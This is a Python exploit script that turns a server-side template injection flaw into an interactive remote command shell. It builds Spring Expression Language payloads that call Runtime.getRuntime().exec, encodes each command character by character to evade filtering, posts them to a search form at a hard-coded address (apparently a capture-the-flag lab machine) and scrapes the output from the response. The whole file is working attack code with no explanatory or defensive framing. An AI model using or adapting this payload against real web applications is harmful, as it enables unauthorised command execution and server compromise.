from bs4 import BeautifulSoup
import requests


def ssti_command_shell(url="", port=""):
    while True:
        com = input('enter_command$ ')
        sp_com = [*com]
        ch2num = ['*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(']
        for i in range(len(sp_com)):
            if i == 0:
                ch2num.append('T(java.lang.Character).toString(' + str(ord(sp_com[i])) + ').concat(')
            elif i < len(sp_com) - 1:
                ch2num.append('T(java.lang.Character).toString(' + str(ord(sp_com[i])) + ')).concat(')
            else:
                ch2num.append('T(java.lang.Character).toString(' + str(ord(sp_com[i])) + '))).getInputStream())}')
        con_com = ''.join(ch2num)
        # print(con_com)
        r = requests.post('http://10.10.11.170:8080/search', data={'name': con_com})
        # print(r.text)
        try:
            soup = BeautifulSoup(r.text, "html.parser")
            out = soup.find("h2", class_="searched").text
            print(out.removeprefix("You searched for: "))
        except Exception as e:
            print("Exception: ", e)


if __name__ == "__main__":
    ssti_command_shell()
